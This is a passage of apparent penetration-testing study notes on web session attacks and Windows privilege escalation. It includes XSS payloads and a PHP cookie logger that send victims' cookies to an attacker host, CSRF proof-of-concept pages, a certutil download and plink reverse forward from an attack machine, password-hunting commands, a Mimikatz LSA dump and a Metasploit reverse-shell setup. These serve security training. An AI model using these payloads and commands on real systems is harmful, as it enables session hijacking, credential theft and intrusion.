**`Open Redirects`:** With a focus on user sessions. This vulnerability occurs when an attacker can redirect a victim to an attacker-controlled site by abusing a legitimate application's redirection functionality. In such cases, all the attacker has to do is specify a website under their control in a redirection URL of a legitimate website and pass this URL to the victim. This is possible when the legitimate application's redirection functionality does not perform any kind of validation regarding the websites which the redirection points to 

<a id="sessionhijackingwebattk"></a>

#### **`Session Hijacking`**

In these attacks, the attacker takes advantage of insecure Session IDs, finds a way to obtain them, and uses them to authenticate to the server and impersonate the victim. An attacker can obtain a victim's Session ID using several methods, with the most common being:
* Passive Traffic Sniffing
* Cross-Site Scripting (XSS)
* Browser history or log-diving
* Read access to a database containing session information


If a SID's security level is low, an attacker may also be able to brute force it or even predict it. In the most basic cases, log into a user session and check the cookies using the Web Developer Tools. Copy the cookie value, then, on a new private windows, navigate to the same web page and replace the current cookie value with the other user's cookie value. 

<a id="sessionfixationwebattk"></a>

#### **`Session Fixation`**

Session Fixation occurs when an attacker can fixate a (valid) Session ID. The attacker will then have to trick the victim into logging into the application using the aforementioned Session ID. If the victim does so, the attacker can proceed to a Session Hijacking attack, since the Session ID is already known. Such bugs usually occur when Session IDs (i.e., cookies) are being accepted from the URL Query Strings or POST data. 

Session Fixation attacks are usually mounted in three stages:

**Stage 1: Attacker manages to obtain a valid Session ID**

Authenticating to an application is not always a requirement to get a valid Session ID, and a large number of applications assign valid Session IDs to anyone who browses them. This also means that an attacker can be assigned a valid Session ID without having to authenticate. 
* An attacker can also obtain a valid SID by creating an account on the targeted application, if this is possible 


**Stage 2: Attacker manages to fixate a valid Session ID**

WHile this is expected behavior, it can turn into a session fixation vulnerability if:
* The assigned Session ID pre-login remains the same post-login AND
* Session IDs (i.e., cookies) are being accepted from URL Query Strings or POST data and propagated to the application

If, for example, a session-related parameter is included in the URL (and not on the cookie header) and any specified value eventually becomes a Session ID, then the attacker can fixate a session. 


**Stage 3: Attacker tricks the victim into establishing a session using the abovementioned Session ID**

All the attacker has to do is craft a malicious URL and lure the victim into visiting it. If the victim does so, the web application will then assign this Session ID to the victim. The attacker can then proceed to a session hijacking attack since the Session ID is already known

<br>

**<u>Identification</u>**

To identify a web server that is potentially vulnerable to Session Fixation, look at the URL. The URL may have a token value within one of the parameters, like the following:
```html
http://domain.com/?redirect_uri=/complete.html&token=<RANDOM TOKEN VALUE>
```
Also, open the Web Developer Tools to check if the session cookie matches the parameter value of the URL. If any value of valid Session ID specified in the token parameter on the URL is propagated to the cookie's value, it is very likely that there is a session fixation vulnerability. 

To confirm this, open a private window and navigate to the same URL, but insert a random value in the parameter. In this case, the URL should look as follows:
```html
http://domain.com/?redirect_uri=/complete.html&token=cookieTakeover
```
Now, open the Web Developer Tools to see if the cookie value is *cookieTakeover*. If this is the case, the web page is vulnerable to session fixation. An attacker could send a URL similar to a victim, and if the victim logs into the application, the attacker could easily hijack their session since the Session ID is already known, as the attacker fixated it. 

<br>

Another way of identifying this vulnerability is by blindly putting the Session ID name and value in the URL and then refreshing the page. For example, consider the following URL:
```html
http://insecure.exampleapp.com/login
```
In this example, the Session ID being used is a cookie named PHPSESSID. To test for session fixation, try the following URL to see if the specified cookie value is propagated to the application:
```html
http://insecure.exampleapp.com/login?PHPSESSID=AttackerSpecifiedCookieValue
```
If this is the case, the attacker has full control over the cookie value and can trick the victim to effectively change their cookie value; the attacker would clearly know the cookie value and can login to the session of the victim by using it.

#### **`Obtaining Session Identifiers without User Interaction`**

There are multiple attacking techniques to obtain Session IDs without user interaction. These attacking techniques can be split into two categories:
* Session ID-obtaining attacks without user interaction
* Session ID obtaining attacks requiring user interaction 


**<u>Obtaining Session Identifiers via Traffic Sniffing</u>**

Traffic sniffing enables users to monitor traffic, giving them an idea of the traffic going through the network (segment) and the services they may attack. Sniffing requires the attacker and the victim to be on the same local network: only then can HTTP traffic be inspected by the attacker. Unless a pcapng file is given, it is impossible for an attacker to perform traffic sniffing remotely. 
* HTTP transfers unencrypted data; thus, if an attacker is monitoring the network, they can catch all kinds of information such as usernames, passwords, and even Session IDs
   * This type of information will be more challenging and, most of the time, impossible to obtain if HTTP traffic is encrypted through SSL or IPSec. 

Obtaining Session IDs through traffic sniffing requires:
* The attacker must be positioned on the same local network as the victim
* Unencrypted HTTP traffic

Wireshark has a built-in filter function that allows users to filter traffic for a specific protocols, like HTTP, SSH, FTP, and even for a particular source IP address. The following attack demonstrates session hijacking:

**1.Simulate the Attacker:** First, make sure that the web page has a cookie value as the Session ID. Then, start wireshark to start sniffing traffic on the local network as follows
```bash
sudo -E wireshark 

```
**2. Simulate the Victim:** Login to the web page with valid credentials


**3. Obtain the Victim's Cookie through Packet Analysis:** Inside Wireshark, apply a filter to see only HTTP traffic. Search within the packet bytes for any session cookie by:
* Navigate to Edit -> Find Packet image
* Left-click on Packet list and then click Packet bytes image
* Select String on the third drop-down menu and specify the Session ID name on the field next to it. Finally, click Find. Wireshark willonly include packets that include the previous string

The cookie can be copied by right-clicking on a row that contains it, then clicking on Copy and clicking the value. 


**4. Hijack the Victim's Session**

Back to the browser window of the attacker, open Web Developer Tools, navigate to storage, and change the current cookie's value to the one obtained through Wireshark. Once the page is refreshed, the attacker should be logged in as the victim

An attacker may not want to continue issuing commands that increase the chances of getting caught.

#### **`XSS`**

An XSS vulnerability may allow an attacker to execute arbitrary JS code within the target's browser and result in complete web application compromise if chained together with other vulnerabilities. 

For an XSS attack to result in session cookie leakage, the following requirements must be fulfilled:
* Session cookies should be carried in all HTTP requests
* Session cookies should be accessible by JS code (the HTTPOnly attribute should be missing)

In user inputs, it is best to use payloads with event handlers, like `onload` or `onerror`, as they fire up automatically and also prove the highest impact on stored XSS cases. If they're blocked, another payload, like `onmouseover` should be used.
 
Enter different payloads in the different fields to see which are vulnerable. The first payload uses `document.domain` to ensure that JS is being executed on the actual domain and not in a sandboxed environment. JS being executed in a sandboxed environment prevents client-side attacks. It should be noted that sandbox escapes exist but are outside of this particular scope:
```js
"><img src=x onerror=prompt(document.domain)>

"><img src=x onerror=confirm(2)>

"><img src=x onerror=alert(1)>

```
If no payload was triggered, try using another functionality within the web application to trigger it. Often, the paylaod won't be executed until another application triggers it. If there is a function that returns another publicly accessible profile would be ideal from an attacker's perspective. If a payload gets executed, check if HTTPOnly is off (false) using the Web Developer Tools. At this point, it will be possible to obtain session cookies through XSS. 

**<u>PHP Cookie Stealing Method</u>**

Again, if there is a function that can create and share publicly accessible profiles that contain specified XSS payloads, this would be ideal to obtain session cookies. This is often shown by a "share" functionality. If this is the case, create a cookie-logging script (log.php) to practice obtaining a victim's session cookie through sharing a vulnerable to stored XSS public profile. The following PHP script can be hosted on the local machine:
```php
<?php
$logFile = "cookieLog.txt";
$cookie = $_REQUEST["c"];

$handle = fopen($logFile, "a");
fwrite($handle, $cookie . "\n\n");
fclose($handle);

header("Location: http://www.google.com/");
exit;
?>

```
This scripts waits for anyone to request `?c=+document.cookie`, and it will then parse the included cookie. The cookie-logging script requires the attacker to host a php server, which can be done as follows:
```bash
php -S x.x.x.x:PORT

```
Now, place the following payload in the vulnerable field. There are no specific requires for the payload, but it is considered more advanced because it may evade some restrictions:
```js
<style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://x.x.x.x:PORT/log.php?c=' + document.cookie;"></video>

```
If testing on a more advanced machine, use [interactsh](https://app.interactsh.com/#/) or XSSHunter. For interactsh, replace the URL with the given domain. A default PHP server or netcat may not send data in the correct form when the target web application uses HTTPS. A samle HTTPS payload is as follows:
```js
<h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>

```
The victim would essentially have to execute the stored XSS on their web browser. When the victim executes the stored XSS, the cookie value should be sent to the attacker inside the newly generated cookieLog.txt file, and the attacker can use it to hijack the victim's session. 

<br>

**<u>Netcat Method</u>**

Instead of using a cookie-logging script, Netcat can be used. Before simulating the attack, of course, identify a user input field that is vulnerable to stored XSS. If this page can be publically shared, that's even better because anyone can be targeted. Once identified, start a netcat listener and input the following payload inside the vulnerable parameter once identified:
```bash
nc -lvnp 9999
```

Once the target executes the stored xss, their cookie value will be returned to the attacker. The cookie is encoded in Base64, however, so it must be decoded to use it: this can be decoded directly in the Dev Console of the Web Developer Tools as follows:
```html
atob("b64_string")
```

#### **`CSRF`**

CSRF is an attack that forces an end-user to execute inadvertent actions on a web application in which they are currently authenticated. This attack is usually mounted with the help of attacker-crafted web pages that the victim must visit or interact with, leveraging the lack of anti-CSRF security mechanisms. These web pages contain malicious requests that essentially inherit the identity and privileges of the victim to perform an undesired function on the victim's behalf. CSRF attacks generally target functions that cause a state change on the server but can also be used to access sensitive data. 

A successful CSRF attack can compromise end-user data and operations when it targets a regular user. If the targeted end-user is an administrative one, a CSRF attack can compromise the entire web application. During CSRF attacks, the attacker does not need to read the server's response to the malicious cross-site request, which means that Same-Origin Policy cannot be considered a security mechanism against CSRF attacks. 

A web application is vulnerable to CSRF attacks when:
* All the parameters required for the targeted request can be determined or guessed by the attacker
* The application's session management is solely based on HTTP cookies, which are automatically included in browser requests

To successfully exploit a CSRF vulnerability, the attacker needs:
* To craft a malicious web page that will issue a valid cross-site request impersonating the victim
* The victim to be logged into the application at the time when the malicious cross-site request is issued

> Many CSRF protections can be evaded in reality

<br>

**<u>CSRF Example</u>**

Assume an attacker is logged into a CSRF-vulnerable web page. The attacker should first navigate to Burpsuite and intercept a request. If there is no `anti-CSRF token` in the request, the web page may be vulnerable to CSRF. 

Look through the source code of the vulnerable web page and modify the following HTML to have the same parameter values:
```html
<html>
   <body>
      <form id="submitMe" action="http://domain.com/directory/update-profile" method="POST">
         <input type="hidden" name="email" value="test@test.com" />
         <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
         <input type="hidden" name="country" value="CSRF_POC" />
         <input type="submit" value="Submit request" />
      </form>
      <script>
         document.getElementById("submitMe").submit()
      </script>
   </body>
</html>

```
Now, serve the page from the attacking machine by starting a web server. Once the target executes the HTML, the details of the vulnerable web page will be modified. If this works, then the web page is definitely vulnerable to CSRF, and a more malicious web page can be crafted. 

<br>

**<u>CSRF GET-based</u>**

CSRF tokens can be extracted from applications that do not use SSL encryption, similar to how session cookies are extracted. 

In this case, assume a CSRF token is included in a GET request; this can be determined by intercepting requests through Burp. Create and serve the following HTML page to the target, including the csrf token:
```html
<html>
   <body>
      <form id="submitMe" action="http://csrf.htb.net/app/save/julie.rogers@example.com" method="GET">
         <input type="hidden" name="email" value="attacker@htb.net" />
         <input type="hidden" name="telephone" value="&#40;227&#41;&#45;750&#45;8112" />
         <input type="hidden" name="country" value="CSRF_POC" />
         <input type="hidden" name="action" value="save" />
         <input type="hidden" name="csrf" value="30e7912d04c957022a6d3072be8ef67e52eda8f2" />
         <input type="submit" value="Submit request" />
      </form>
      <script>
         document.getElementById("submitMe").submit()
      </script>
   </body>
</html>

```
Once the target visits the malicious page, the details of the profile will change to those specified in the malicious page. 

<br>

**<u>CSRF POST-based</u>**

The majority of applications perform actions through POST requests; subsequently, CSRF tokens will reside in POST data. The following finds a way to leak the CSRF token so that a CSRF attack can be mounted. This attack can be done remotely, as it is essentially HTML injection. 

In this case, find an XSS-vulnerable URL, typically reflected XSS. Test this by inputting the following HTML in the URL:
```html
<h1>h1<u>underline<%2fu><%2fh1>

```
If the payload is reflected, then start a netcat listener and insert the following payload in the URL:
```html
%3Ctable background='%2f%2fx.x.x.x:PORT%2f
```
The connection will leak the CSRF token to the attacker.

#### **`System Enumeration`**

The first step to escalate privileges on a Windows machine is to **view the architecture, OS version, OS name,** etc. This can be done with the following command; similar to Linux, the pipe `|` can be used to grep specific information:
```bash
systeminfo 

systeminfo | findstr /B /C:"OS Name" /C:"OS Version" /C:"System Type"
```
The **architecture (System Type)** is important to know because a 64 bit (x64) exploit won't work on a machine with 32 bit (x86) architecture and vice-versa. The **kernel version (OS Version)** is important to know because kernel exploits are reliant on the Kernel version. Finally, the **OS Name** is important to know because some exploits only work on certain types of the OS (i.e., Home v Enterprise). The previous command shows the **hostname**, but to get that as a single output, type `hostname`

Standard Windows processes, such as Session Manager Subsystem (smss.exe), Client Server Runtime Subsystem (csrss.exe), WinLogon (winlogon.exe), Local Security Authority Subsystem Service (LSASS), and Service Host (svchost.exe),etc., are essential to the OS. By quickly spotting standard processes/services and effectively disregarding them, the focus can shift on non-standard processes/services, which may open up a privesc path. The following command **looks at the running processes,** disclosing what applications are currently running on the system:
```bash
tasklist /svc

```
Environment variables, particularly **PATH and HOME DRIVE,** can sometimes be overlooked. It is not uncommon for administrators or applications to modify the PATH; i.e., placing Python or Java in the path, which would enable the execution of Python or .jar files. If the folder placed in the PATH is writable by the user, it may be possible to perform DLL injections against other applications. It is important to remember that when running a program on Windows, the program is sought out for in the CWD first, then the PATH going left to right, so if a custom path is placed on the left, it is much more dangerous than on the right. As for HOME DRIVE, most enterprises have this as a file share, so navigating to the file share itself may reveal other directories that can be accessed. Additionally, shares are used for home directories so the user cna log on to other computers and have the same UI (AKA Roaming Profiles; malicious files also move with those users). To **print out the environment variables,** the following build-in command can be used:
```bash
set

```
WMI (Windows Management Instrumentation) can be used in various ways. WMI returns information about the current system; however, it may not work on all machines. WMI QFE (Quick Fix Engineering) can be used in the command line to **extract patching information.** If the system supports the following command, it will display the HotFixID (knowledge base) values which can be used to see which patches were applied to the machine:
```bash
wmic qfe
wmic qfe get Caption,Description,HotFixID,InstalledOn
```
```powershell
Get-HotFix | ft -AutoSize        #same but in PS

```
WMI can also be used to **view the drives on the machine.** It is imperative to look through all of the drives on the machine, not just the C drive:
```bash
wmic logicaldisk

wmic logicaldisk get caption,description,providername

list drives

```
Finally, WMI can also be used to **display installed software.** This information can guide attackers towards "unseen" exploits. Also, some programs may be installed and running as a service that is vulnerable:
```bash
wmic product get name
```
```powershell
Get-WmiObject -Class Win32_Product |  select Name, Version        #same but in PS
```

#### **`User & Group Enumeration`**

First, look through the **privileges and groups of the current user** while on a CMD prompt. Notate the enabled user and group privileges from the output of the following commands:
```bash
whoami /priv

whoami /groups

```
Now, view **all of the users** on the machine while on a CMD prompt; remember that service accounts will not show up. To view more information about a specific user, such as password set date, password expieration, and local/group memberships, type the second command:
```bash
net user

net user <user>

```
To view the **users that are logged on to the system** and their activity state:
```bash
query user

```
Finally, check the **membership of local groups.** While this may not work on all machines, it is worth trying. If a particular local group is known, more information about the group can be gathered with the second command. Also, there are sometimes passwords or information of interest stored in the group's description:
```bash
net localgroup

net localgroup administrators

```
While it is possible to enumerate the **password policy and other account information** before gaining a foothold, the following is a direct command to run on a cmd prompt to get this information, in case it was not previously enumerated:
```bash
net accounts
```

<a id="networkenumwindowsprivesc"></a>

#### **`Network Enumeration`**

Check the DNS Servers, default gateways, and check for other IP interfaces on the current machine first. If there are interfaces with IP addresses on different networks, the current machine can possibly be used as a pivot host:
```bash
ipconfig 

ipconfig /all

```
Look at the **ARP table** for potential pivots; the network and broadcast addresses may not be so important, but other IP addresses should arouse suspicion:
```bash
arp -a

```
The **routing table** may hold other important information for pivoting:
```bash
route print

```
It is important to determine which **ports are open and listening,**  and compare them to those from the initial nmap scan. This command can be especially important for **password hunting too.** Netstat can be used for this, and then plink, meterpreter, SOCKSOverRDP, etc. can be used to leverage port forwarding. For example, if 0.0.0.0:445 is open on the current machine and was not on the nmap scan, try to `port forward` to access the internal SMB shares:
```bash
netstat -ano

```
There is more information about [Port Forwarding](#pivotunelportforward) in the *Exploitation section* but for a quick demonstration with [plink](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html), first download the executable on the attack machine (or the target machine if it has access to the internet) with the same architecture as the target machine. On the WIndows target machine, go to a writeable directory and transfer the file from the attack machine via certutil by hosting a server:
```bash
certutil -urlcache -f http://x.x.x.x/plink.exe plink.exe

```
Make sure that the SSH server is started on the attack host. Once this is done, execute plink on the Windows target machine with the ports of the internal services that are not externally available; which is port 445 in this case (the first 445 for the target machine and the last 445 is for the attack machine). It may be necessary to hit enter many times for responses. Once this is done, confirm that port 445 is being forwarded with the second command:
```powershell
plink.exe -l attacker_user -pw <attacker password> -R 445:127.0.0.1:445 x.x.x.x      #IP address of attack host

netstat -ano | grep 445 
```
This will give a shell of the attack host within the target host. By checking the port status on localhost, this can be confirmed; however, the attack host user may not be authorized to access the port (i.e., smbshare). In this case, it will be necessary to have credentials of a user on the target machine.


Once a password is found, use winexe, impacket-wmiexec, impacket-psexec, evil-winrm, xfreerdp, etc. on the attack host shell on the target host:
```bash
winexe -U username%password //127.0.0.1 "cmd.exe"
```

<a id="namedpipeswindowsprivesc"></a>

#### **`Named Pipes`**

Pipes are essentially files stored in memory that get cleared out after being read. Cobalt Strike uses named pipes for every command (except BOF); the workflow looks as follows:

**1. Beacon starts a named pipe of \\.\pipe\msagent_12**

**2. Beacon starts a new process and injects command into that process directing output to \\.\pipe\msagent_12**

**3. Server displays what was written into \\.\pipe\msagent_12**

Cobalt Strike does this because if the command being ran got flagged by AV or crashed, it would not affect the beacon (process running the command). Often, Cobalt Strike users change their named pipes to masquerade as another program. One of the most common examples is mojo instead of msagent. 

Pipes are used for communication between two applications or processed using shared memory. There are two types of pipes: **named pipes** and **anonymous pipes.**
* Windows ystems use a client-server implementation for pipe communication. In this type of implementation, the process that creates a named pipe is the server, and the process communicating with the named pipe is the the client. 
* Named pipes can communicate using half-duplex, or a one-way channel with the client only being able to write data to the server, or duplex, which is a two-way communication channel that allows the client to twite data over the pipe, and the server to respond back with data over that pipe
  * Every active connection to a named pipe server results in the creation of a new named pipe; these all share the same pipe name but communicate using a different data buffer. 

To **enumerate instances of named pipes,** use PipeList from the Sysinternals Suite or PowerShell as follows:
```powershell
pipelist.exe /accepteula

Get-ChildItem \\.\pipe\

```
After getting a list of named pipes, use Accesschk from the Sysinternals Suite to **enumerate the permissions assigned to a specific named pipe by reviewing the DACL,** which shows who has the permissions to modify, write, read, or execute a resource; the first command looks at the LSASS process and the second command reviews the DACLs of all named pipes:
```powershell
accesschk.exe /accepteula \\.\Pipe\lsass -v

.\accesschk.exe /accepteula \pipe\.

accesschk.exe -w \pipe\* -v   #all named pipes that allow write access
```
Named pipes can also be used to escalate privileges. When using accesschk to search for all named pipes that allow write access, and **`WindscribeService`** appears with rw access to the Everyone group, privileges can be escalated with [metasploit](https://www.exploit-db.com/exploits/48021). Therefore, it is important to search vulnerabilities on all the named pipes with rw access for all authenticated users. For this example, the following command confirms that the Everyone group has these privileges (FILE_ALL_ACCESS) over the pipe:
```powershell
accesschk.exe -accepteula -w \pipe\WindscribeService -v
```

#### **`Files & PowerShell Credentials`**

Password hunting is typically automated but it is still important to manually go through files to find passwords because end users often store them there. Particularly, file extenstions **`.ini`, `.txt`, `.config`, and `.xml`** often include passwords. It is important to note that:
* Passwords can be stored without explicitly stating password 
* Other important extensions to look for are **.json, .yml, .env, and .log,** but the previous extensions are more likely to store credentials. 


**<u>Application Configuration Files</u>**

Applications often store passwords in cleartext config files. If gaining a foothold with a low-level user account, it may be possible to find credentials for their admin account or another privileged local or domain account:
```bash
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml
```
Sensitive IIS information, such as credentials may be stored in a `web.config` file. For the default IIS website, this could be located at **`C:\inetpub\wwwroot\web.config`,** but there may be multiple versions of this file in different locations, which can be searched for recursively. 

<br>

**<u>Dictionary Files</u>**

Sensitive information such as passwords may be entered in an email client or a browser-based application, which underlines any words it doesn't recognize. The user may add these words to their dictionary to avoid the red underline
```powershell
gc 'C:\Users\username\AppData\Local\Google\Chrome\User Data\Default\Custom Dictionary.txt' | Select-String password

```
**<u>Unattended Installation Files</u>**

Unattended installation files may define auto-logon settings or additional accounts to be created as part of the installation. Although the following files should be automatically deleted as part of the installation, sysadmins may have created copies of the file in other folders during the development of the image and answer file. Passwords in the following places (often unattend.xml) are stored in plaintext or base64 encoded:
* C:\unattend.xml 

* C:\sysprep.inf

* C:\sysprep\sysprep.xml

* %WINDIR%\Panther\Unattend\Unattended.xml

* %WINDIR%\Panther\Unattended.xml

<br>

**<u>PowerShell History File</u>**

Starting with PowerShell 5.0 in Windows 10, PowerShell stores command history to the file: `C:\Users\username\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`. To **confirm the PowerShell History Save Path,** run the following command:
```powershell
(Get-PSReadLineOption).HistorySavePath
```
Now, either navigate to the location and read the file or **read its contents** with gc:
```powershell
gc (Get-PSReadLineOption).HistorySavePath
```
The following one-liner can be used to **retrieve the contents of all PowerShell history files that the current user can access.** It is important to check these files, especially as a low-level account, as these they should not be able to read the PowerShell history of other users:
```powershell
foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}
```
PowerShell credentials are often used for scripting and automation tasks as a way to store encrypted credentials conveniently. The credentials are protected using DPAPI, which typically means they can only be decrypted by the same user on the same computer they were created on.

**<u>Registry</u>**

The registry is a great place to get easy wins. Certain programs and Windows configurations can result in clear text passwords or other data being stored in the registry. These can be extracted via Lazagne and SessionGopher, but in restricted environments, this is important to know.

**Windows Autologon:** Allows a user to configure their Windows OS to automatically log on to a specific user account, without requiring manual input of the username and password at each startup; however, once this is configured, the username and password are stored in the registry in clear text. This feature is commonly used on single-user systems or in situations where convenience outweighs the need for enhanced security. The typical configuration of an Autologon account involves the manual setting of the following registry keys:
* **`AdminAutoLogon`:** Determines whether Autologon is enabled or disabled. A value of "1" means it is enabled

* **`DefaultUserName`:** Holds the value of the username of the account that will automatically log on

* **`DefaultPassword`:** Holds the value of the password for the user account specified previously

The registry keys associated with Autologon can be found under `HKEY_LOCAL_MACHINE` in the following hive, and **can be accessed by standard users:**
```powershell
HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon

reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon"
```
**PuTTY:** For PuTTY sessions using a proxy connection, when the session is saved, the credentials are stored in the registry in clear text. Note that the access controls for registry keys are tied to the user account that configured and saved the session; therefore, in order to see it, the attacker would have to be logged in as that user and search the `HKEY_CURRENT_USER` hive. Subsequently, if the attacker has admin privileges, they would be able to find it under the corresponding user's hive in `HKEY_USERS`
```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions    #finds available sessions
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions"    #alternate if first doesn't work
```
With the available sessions, query the session to get potentially get the clear-text password:
```powershell
reg query HKEY_CURRENT_USER\SOFTWARE\SimonTatham\PuTTY\Sessions\<SESSION NAME>

```
**Besides the previous commands, try the following registry queries:**
```powershell
reg query "HKCU\Software\ORL\WINVNC3\Password"  #VNC passwords

reg query "HKLM\SYSTEM\Current\ControlSet\Services\SNMP"    #SNMP creds

reg query HKLM /f password /t REG_SZ /s      #searches registry for any keys containing "password"

```

<a id="windowsprivescprivbasedesc"></a>

### **`User Privileges`**

Privileges are rights that an account can be granted to perform a variety of operations on the local system such as managing services, loading drivers, shutting down the system, and debugging an application; this is different from access rights, which a system uses to grant or deny access to securable objects. **Security Principals (processes)** are the primary way of controlling access to resources on Windows hosts. Every single security principle is identified by a unique Security Identifier (SID). When a security principal is created, it is assigned a SID which remains assigned to that principal for its lifetime. 

User and group **privileges are stored in a database and granted via an access token when a user logs on to a system.** An account can have local privileges on a specific computer and different privileges on different systems if the account belongs to an AD domain. Each time a user attempts to perform a privileges action, the system reviews the user's access token to see if the account has the required privileges, and if so, checks to see if they are enabled. **Most privileges are disabled by default,** but some can be enabled by opeing an administrative cmd.exe or PowerShell console, while others can be enabled manually.

Depending on group membership, and other factors such as privileges assigned via domain and local group policy, users can have various rights assigned to their account; however, escalating privileges based on inherited group privileges will be considered a **[different escalation route](#windowsprivescgroupprivs)** in my notes. The following are some of the key user rights assignments, which are settings applied to the localhost. These rights allow users to perform tasks on the system such as logon locally or remotely, access the host from the network, or shut down the server:

<center>

|Setting Constant|Setting Name|Assignment|Description|
|----------------|------------|----------|-----------|
|`SeNetworkLogonRight`|Access this computer from the network|Administrators, Authenticated Users|Determines which users can connect to the device from the network. This is required by network protocols such as SMB, NetBIOS, CIFS, and COM+|
|`SeRemoteInteractiveLogonRight`|Allow log on through Remote Desktop Services|Administrators, Remote Desktop Users|Determines which users or groups can access the login screen of a remote device through a Remote Desktop Services connection. A user can establish a Remote Desktop Services connection to a particular server but not be able to log on to the console of that same server|
|`SeBackupPrivilege`|Back up files and directories|Administrators|Determines which users can bypass file and directory, registry, and other persistent object permissions for the purposes of backing up the system|
|`SeSecurityPrivilege`|Manage auditing and security log|Administrators|Determines which users can specify object access audit options for individual resources such as files, AD objects, and registry keys. These objects specify their SACL. A user assigned this right can view and clear the Security log in Event Viewer|
|`SeTakeOwnershipPrivilege`|Take ownership of files or other objects|Administrators|Determines which users can take ownership of a any securable object in the device, including AD objects, NTFS files and folders, printers, registry keys, services, processes, and threads|
|`SeDebugPrivilege`|Debug programs|Administrators|Determines which users can attach to or open any process, even a process they do not own. Developers who are debugging their applications do not need this user right, but developers whoa re debugging new systsem components do. This right provides access to sensitive and critical OS components|
|`SeImpersonatePrivilege`|Impersonate a client after authentication|Administrators, Local Service, Network Service, Service|Determines which programs are allowed to impersonate a user or another speciifed account and act on behalf of the user|
|`SeLoadDriverPrivilege`|Load and unload device drivers|Administrators|Determines which users can dynamically load and unload device drivers. This right is not required if a signed driver for the new hardware already exists in the driver.cab file on the device. Device drivers run as highly privileged code|
|`SeRestorePrivilege`|Restore files and directories|Administrators|Determines which users can bypass file, directory, registry, and other persistent object permissions when they restore backed up files and directories. It determines which users can set valid security principals as the owner of an object|

</center>

While typing `whoami /priv` gives a listing of all user rights assigned to the current user, some rights are only available to administrative users and can only be leveraged when running an elevated cmd or PowerShell session (As of Windows Vista); therefore, comparing the rights in an elevated console and a non-elevated console may be significantly different, so it is imperative to check to see if the current user can open a cmd/PowerShell session with administrative rights. 

A right in a Disabled state indicates that the current account has the specific privilege assigned, but it cannot be used in an access token to perform the associated actions until it is enabled. Windows does not provide a way to enable privileges, so a script needs to be used. 

<a id="windowsprivescseimpersonetseassignptoken"></a>

#### **`SeImpersonate and SeAssignPrimaryToken`**

Every process has a token that has information about the account that is running it in Windows. These tokens are not considered secure resources, as they are just locations within memory that could be brute-forced by users that cannot read memory. To use the token, the SeImpersonate privilege is needed; however, it is only given to administrative accounts. Legitimate programs may use another process's token to escalate from Administrator to Local System, which has additional privileges. There are two types of tokens:
* **`Delegate`:** Created for logging into a machine or using Remote Desktop. This is the most common
* **Impersonate:** "Non-interactive" such as attaching a network drive or domain logon script. 

Oftentimes, **this privilege is seen after gaining RCE via an application that runs in the contect of a service account;** i.e., uploading a web shell to an ASP.NET web application, achieving RCE through a Jenkins installation, or by executing commands through MSSQL queries. Because of this, every time access is gained this way, it is critical to immediately check for for this privilege because it is a quick win. A comprehensive list on other **[impersonation privileges](https://swisskyrepo.github.io/InternalAllTheThings/redteam/escalation/windows-privilege-escalation/#eop-impersonation-privileges)** that can be exploited to escalate privileges are found on GitHub. 

There are many ways to escalate privileges if the current user has either of these two privileges:
* Token Impersonation via Metasploit
* Dump LSA via Mimikatz
* Potato Attacks via Metasploit or Manual Exploitation

**`Metasploit: Token Impersonation`**

</center>

If on a **meterpreter shell,** check the privileges of the current user, load the incognito module if the the required privileges are present, and then list the tokens:
```bash
getprivs
load incognito
list_tokens -u
```
Depending on the output, there may be several delegate tokens available. This can be leveraged to impersonate one of the listed users with an available delegate token, as follows:
```bash
impersonate_token domain\\username

```

**`Mimikatz: Dump LSA`**

</center>

With Mimikatz, try to dump the LSA off the domain controller if logged on to the target machine **as a domain admin.** This will not work if logged on to the target machine as a non-domain admin:
```powershell
#Mimikatz.ps1
Invoke-Mimikatz -Command '"privilege::debug" "LSADump::LSA /inject" exit' -Computer DOMAIN.controller.local

```
<center>

**`Potato (Juicy) Attacks`**

</center>

> It is important to note that JuicyPotato does not work on Windows 10 (post-1709) or Server 2019+ due to changes in the COM infrastructure. In such cases, use RoguePotato or SweetPotato.

Attackers often abuse this privilege with **Potato Attacks,** where a service account can SeImpersonate, but not obtain SYSTEM level privileges. Essentially, the potato attack tricks a process running as SYSTEM to connect to their process, which hands over the token to be used. There are several versions of potato attacks, including **[potato.exe](https://github.com/foxglovesec/Potato/tree/master/source/Potato/Potato/bin/Release), [rottenpotato.exe](https://github.com/breenmachine/RottenPotatoNG), [juicypotato.exe](https://github.com/ohpe/juicy-potato) and hotpotato.exe.** It is important to remember that some of these scripts may need to be compiled if metasploit is not used. At a high-level, potato attacks:

**1. Trick the "NT AUTHORITY\SYSTEM" account into authenticating via NTLM to an attacker-controlled TCP endpoint**

**2. MiTM this authentication attempt (NTLM Relay) to locally negotiate a security token for the "NT AUTHORITY\SYSTEM" account.** This is done through a series of Windows API calls

**3. Impersonate the negotiated token.** This can only be done if the attacker's current account has the privileges to impersonate security tokens. Most service accounts have these privileges enabled, while most user accounts do not; however, user privilege enumeration should be done regardless for other attack routes.

There are several ways to conduct this attack, either via metasploit or manual exploitation. If on a **meterpreter shell,** confirm this vulnerability with the `post/multi/recon/local_exploit_suggester` module; if on a reverse/bind shell, copy the output from the systeminfo command and put it in a file on the attack host, then run **[Windows Exploit Suggester](#windowsprivescautomatedtools).**

**<u>Metasploit</u>**

This attack is much easier to do with metasploit; if already on the target machine via a reverse/bind shell, a meterpreter shell can be obtained by using the following module and entering the yielded payload on the target machine:
```bash
use exploit/multi/script/web_delivery
set target PSH          #PowerShell; try Regsvr32 if this does not work
set payload windows/meterpreter/reverse_tcp     #try windows/x64/meterpreter/reverse_tcp with the correct arch
set srvhost x.x.x.x
set lhost x.x.x.x

```
